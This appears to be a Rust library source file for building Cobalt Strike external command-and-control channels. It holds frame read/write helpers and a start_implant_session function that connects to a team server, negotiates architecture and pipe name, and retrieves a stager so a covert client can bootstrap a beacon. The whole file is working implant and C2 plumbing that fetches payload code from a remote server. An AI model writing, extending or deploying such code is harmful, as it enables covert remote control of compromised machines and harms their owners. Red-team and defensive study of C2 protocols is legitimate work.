#![warn(missing_docs)]

//! Helper utilities for creating [external c2][1] systems for [cobaltstrike][2].
//!
//! ![C2](https://i.ibb.co/Cszd81H/externalc2.png)
//!
//!
//!
//![1]: https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/listener-infrastructue_external-c2.htm
//! [2]: https://www.cobaltstrike.com/

use anyhow::{Context, Result};
use async_trait::async_trait;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
};
/// Reads cobaltstrike frames from an asynchronous source.
#[async_trait]
pub trait CSFrameRead {
    /// Reads a single frame.
    async fn read_frame(&mut self) -> Result<Vec<u8>>;
}

/// Writes cobaltstrike frames from an asynchronous source.
#[async_trait]
pub trait CSFrameWrite {
    /// Write a single frame.
    async fn write_frame(&mut self, data: &[u8]) -> Result<()>;
}

#[async_trait]
impl<T> CSFrameWrite for T
where
    T: AsyncWriteExt + std::marker::Unpin + std::marker::Send,
{
    async fn write_frame(&mut self, data: &[u8]) -> Result<()> {
        let size: u32 = data.len().try_into()?;
        self.write_u32_le(size).await?;
        self.write_all(data).await?;
        return Ok(());
    }
}

#[async_trait]
impl<T> CSFrameRead for T
where
    T: AsyncReadExt + std::marker::Unpin + std::marker::Send,
{
    async fn read_frame(&mut self) -> Result<Vec<u8>> {
        let size = self.read_u32_le().await?.try_into()?;
        let mut buf: Vec<u8> = vec![0; size];
        self.read_exact(buf.as_mut_slice()).await?;
        return Ok(buf);
    }
}

/// Starts a session with the team server.
///
/// After the session handshake is complete a stager is returned and put in a Vec<u8>.
/// Use covert client to bootstrap the cobalt strike beacon.
pub async fn start_implant_session(
    ts_address: &str,
    arch: &str,
    pipename: &str,
) -> Result<(Vec<u8>, TcpStream)> {
    let mut conn = TcpStream::connect(ts_address)
        .await
        .context("Failed to connect to TS")?;
    conn.write_frame(format!("arch={}", arch).as_bytes())
        .await?;
    conn.write_frame(format!("pipename={}", pipename).as_bytes())
        .await?;
    conn.write_frame("block=500".as_bytes()).await?;
    conn.write_frame("go".as_bytes()).await?;
    let res = conn.read_frame().await?;
    return Ok((res, conn));
}
